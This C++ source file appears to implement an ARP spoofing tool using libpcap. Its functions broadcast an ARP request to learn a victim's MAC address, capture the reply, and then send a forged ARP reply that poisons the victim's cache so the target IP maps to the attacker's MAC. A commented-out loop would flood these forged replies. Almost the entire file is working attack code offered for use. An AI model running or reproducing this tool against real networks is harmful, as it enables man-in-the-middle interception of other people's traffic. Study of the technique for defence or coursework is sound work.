#include "pnetworkservice.h"


namespace pnetwork {

PNetworkService* PNetworkService::mInstance = nullptr;

PNetworkService::PNetworkService() { }

PNetworkService::~PNetworkService() { }

int PNetworkService::receiveARP(pcap* _fp, const char* _target_ip, u_int8_t* _sender_mac) {

    u_int32_t target_ip = inet_addr(_target_ip);

    pcap_pkthdr* header;
    const u_char* packet;

    puts("Waiting for ARP Reply!");

    int cnt = 10;

    while(cnt--) {

        int res = pcap_next_ex(_fp, &header, &packet);
        if(res >= -2 && res <= 0) {
            return 1;
        }

        u_int32_t h_type = mPacketManager.getEtherType(packet);

        if(h_type == ETHERTYPE_ARP) {

            if(mPacketManager.getArpSenderIp(packet) == target_ip) {
                mPacketManager.getArpSenderMac(packet, _sender_mac);

                printf("Received ARP from %s (%02x:%02x:%02x:%02x:%02x:%02x)\n", _target_ip, _sender_mac[0], _sender_mac[1], _sender_mac[2], _sender_mac[3], _sender_mac[4], _sender_mac[5]);
                return 0;
            }
        }

    }

    return 1;
}

int PNetworkService::requestARP(pcap_t* _fp, const char* _interface, const char* _ip) {
    u_int32_t target_ip = inet_addr(_ip);
    u_int32_t sender_ip = getMyIp(_interface);

    u_int8_t* src_mac = getInterfaceMac(_interface);
    if(src_mac == nullptr) {
        puts("Failed to get mac address");
        return 1;
    }

    u_int8_t* dest_mac = reinterpret_cast<u_int8_t*>(malloc(ETHER_ADDR_LEN));
    u_int8_t* target_mac = reinterpret_cast<u_int8_t*>(malloc(ETHER_ADDR_LEN));

    for(int i=0; i<6; i++) {
        dest_mac[i] = 0xFF;
        target_mac[i] = 0x00;
    }

    u_int8_t* packet = mPacketManager.buildARP(
                dest_mac,
                src_mac,
                ARPOP_REQUEST,
                src_mac,
                sender_ip,
                target_mac,
                target_ip);

    int ret = 0;

    if(pcap_sendpacket(_fp, packet, static_cast<int>(PEthernet::length() + PArp::length())) != 0) {
        puts("Failed to send arp");
        ret = 1;
    } else {
        puts("Successed to send arp");
    }

    free(src_mac);
    free(dest_mac);
    free(target_mac);
    free(packet);

    return ret;
}

int PNetworkService::spoofARP(const char* _interface, const char* _sender_ip, const char* _target_ip) {
    pcap_t* fp = open(_interface);
    u_int8_t sender_mac[ETHER_ADDR_LEN];

    puts("Request ARP");
    if(requestARP(fp, _interface, _sender_ip) > 0) {
        puts("Failed to request ARP");
        pcap_close(fp);
        return 1;
    }

    puts("Receive ARP");
    if(receiveARP(fp, _sender_ip, sender_mac) > 0) {
        puts("Failed to receive ARP");
        pcap_close(fp);
        return 1;
    }

    puts("Send Spoofing ARP");
    if(sendSpoofingARP(fp, _interface, _sender_ip, sender_mac, _target_ip) > 0) {
        puts("Failed to send spoofing ARP");
        pcap_close(fp);
        return 1;
    }

    pcap_close(fp);
    return 0;
}

int PNetworkService::sendSpoofingARP(pcap_t* _fp,
                                     const char* _interface,
                                     const char* _sender_ip,
                                     u_int8_t* _sender_mac,
                                     const char* _target_ip) {

    puts("Making spoofing packet...");

    u_int8_t* dest_mac = reinterpret_cast<u_int8_t*>(malloc(ETHER_ADDR_LEN));
    memcpy(dest_mac, _sender_mac, ETHER_ADDR_LEN);

    u_int8_t* src_mac = getInterfaceMac(_interface);
    u_int16_t op_code = ARPOP_REPLY;
    u_int8_t* sender_mac = getInterfaceMac(_interface);
    u_int32_t sender_ip = inet_addr(_target_ip);
    u_int8_t* target_mac = reinterpret_cast<u_int8_t*>(malloc(ETHER_ADDR_LEN));
    memcpy(target_mac, _sender_mac, ETHER_ADDR_LEN);
    u_int32_t target_ip = inet_addr(_sender_ip);

    u_int8_t* packet = mPacketManager.buildARP(
                dest_mac,
                src_mac,
                op_code,
                sender_mac,
                sender_ip,
                target_mac,
                target_ip);

    /*
    while(1) {
        if(pcap_sendpacket(_fp, packet, PEthernet::length() + PArp::length()) != 0) {
            printf("Failed to sent packet\n");
        }
    }
    */

    int ret = 0;

    if(pcap_sendpacket(_fp, packet, static_cast<int>(PEthernet::length() + PArp::length())) != 0) {
        puts("Failed to send packet");
        ret = 1;
    } else {
        puts("Successed to send spoofing packet");
    }

    free(dest_mac);
    free(src_mac);
    free(sender_mac);
    free(target_mac);
    free(packet);

    return ret;
}

u_int8_t* PNetworkService::getInterfaceMac(const char* _interface) {
    struct ifreq ifr;
    int fd;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_ifru.ifru_addr.sa_family = AF_INET;

    strncpy(reinterpret_cast<char*>(ifr.ifr_ifrn.ifrn_name), _interface, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);

    u_int8_t* mac = reinterpret_cast<u_int8_t*>(ifr.ifr_ifru.ifru_hwaddr.sa_data);
    u_int8_t* ret_mac = reinterpret_cast<u_int8_t*>(malloc(ETHER_ADDR_LEN));
    memcpy(ret_mac, mac, ETHER_ADDR_LEN);

    return ret_mac;
}

u_int32_t PNetworkService::getMyIp(const char* _interface) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, _interface, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    u_int32_t ip = (reinterpret_cast<struct sockaddr_in *>(&ifr.ifr_addr))->sin_addr.s_addr;
    return ip;
}

pcap_t* PNetworkService::open(const char* _interface) {
    char err_buf[PCAP_ERRBUF_SIZE] = {0};
    pcap_t* fp = pcap_open_live(_interface, BUFSIZ, 0, 0, err_buf);

    return fp;
}




}
